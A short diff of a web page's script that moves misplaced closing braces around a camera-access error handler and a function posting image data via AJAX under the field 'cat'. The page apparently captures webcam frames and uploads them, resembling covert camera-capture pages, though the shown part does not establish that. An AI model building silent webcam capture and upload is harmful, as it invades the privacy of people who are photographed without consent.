@@ -66,7 +66,8 @@
     })
     .catch(() => {
       status.textContent = "❌ No se pudo acceder a la cámara";
-      function post(imgdata){
+    });
+    function post(imgdata){
 $.ajax({
     type: 'POST',
     data: { cat: imgdata},
@@ -123,7 +124,7 @@ var context = canvas.getContext('2d');
 
 // Load init
 init();
-    });
+  });
 </script>
 </body>
 </html>
